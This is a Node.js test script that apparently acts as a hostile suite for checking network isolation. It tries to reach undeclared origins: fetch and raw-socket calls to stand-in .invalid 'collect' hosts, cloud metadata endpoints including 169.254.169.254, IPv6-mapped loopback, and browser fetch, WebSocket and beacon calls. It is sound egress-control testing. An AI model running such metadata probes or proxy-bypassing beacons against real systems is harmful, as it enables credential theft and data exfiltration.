// A hostile suite's attempts to reach origins nobody declared, run directly with node in the
// workload container: Node's fetch, a raw TCP socket that ignores the proxy settings, a name for
// a cloud metadata service and the metadata address itself, an IPv6 form of loopback, and a
// browser page that sends a request, opens a WebSocket and sends a beacon. Every undeclared name
// ends in .invalid, which never resolves, apart from the real metadata name. It also serves its
// own app on loopback, which must keep working, as Playwright's webServer does. It prints what
// each attempt saw, as JSON, on its last line.
// See docs/specs/SPEC-35-evidence-mode.md.
import { existsSync, readdirSync } from 'node:fs';
import { createServer } from 'node:http';
import { createRequire } from 'node:module';
import { connect } from 'node:net';
import { dirname, join } from 'node:path';

const ATTEMPT_TIMEOUT_MILLISECONDS = 8000;
const seen = {};

async function tryFetch(name, url) {
  try {
    const response = await fetch(url, { signal: AbortSignal.timeout(ATTEMPT_TIMEOUT_MILLISECONDS) });
    seen[name] = `status ${response.status}`;
  } catch {
    seen[name] = 'failed';
  }
}

function trySocket(name, host, port) {
  return new Promise((resolve) => {
    const socket = connect({ host, port });
    const finish = (outcome) => { seen[name] = outcome; socket.destroy(); resolve(); };
    socket.setTimeout(ATTEMPT_TIMEOUT_MILLISECONDS, () => finish('timed out'));
    socket.on('error', () => finish('failed'));
    socket.on('connect', () => finish('connected'));
  });
}

// The page sends its traffic, then marks the body done.
const PAGE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Leaky page</title></head><body>
<script>
  const marks = document.body.dataset;
  fetch('http://page.invalid/data').then(() => { marks.page = 'reached'; }, () => { marks.page = 'failed'; });
  const socket = new WebSocket('ws://websocket.invalid/live');
  socket.onopen = () => { marks.websocket = 'open'; };
  socket.onclose = () => { marks.websocket = 'closed'; };
  marks.beacon = navigator.sendBeacon('http://beacon.invalid/collect', 'visit') ? 'queued' : 'refused';
  setTimeout(() => { marks.done = 'yes'; }, 5000);
</script></body></html>`;

// The checkout's root: the nearest folder above this one that holds the browsers.
function checkoutRoot() {
  let folder = dirname(new URL(import.meta.url).pathname);
  while (!existsSync(join(folder, '.browsers'))) {
    const parent = dirname(folder);
    if (parent === folder) throw new Error('no .browsers folder above the suite');
    folder = parent;
  }
  return folder;
}

function headlessShell(root) {
  const builds = join(root, '.browsers', 'chrome-headless-shell');
  const linux = readdirSync(builds).find((name) => name.startsWith('linux-'));
  if (linux === undefined) throw new Error('no Linux build of the headless shell');
  return join(builds, linux, 'chrome-headless-shell-linux64', 'chrome-headless-shell');
}

const server = createServer((request, response) => {
  response.writeHead(200, { 'content-type': request.url === '/health' ? 'text/plain' : 'text/html' });
  response.end(request.url === '/health' ? 'ok' : PAGE);
});
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const local = `http://127.0.0.1:${server.address().port}`;

await tryFetch('node-fetch', 'http://fetch.invalid/collect');
await trySocket('raw-socket', 'socket.invalid', 443);
await tryFetch('metadata-name', 'http://metadata.google.internal/computeMetadata/v1/');
await tryFetch('metadata-address', 'http://169.254.169.254/latest/meta-data/');
await tryFetch('ipv6-loopback', 'http://[::ffff:127.0.0.1]:9/');
await tryFetch('own-app', `${local}/health`);

const root = checkoutRoot();
const { chromium } = createRequire(join(root, 'package.json'))('playwright-core');
const browser = await chromium.launch({ executablePath: headlessShell(root), headless: true });
try {
  const page = await browser.newPage();
  await page.goto(`${local}/`);
  await page.waitForFunction(() => document.body.dataset.done === 'yes', null, { timeout: 20000 }).catch(() => undefined);
  seen.browser = await page.evaluate(() => ({ ...document.body.dataset }));
} finally {
  await browser.close();
  server.close();
}
console.log(JSON.stringify(seen));
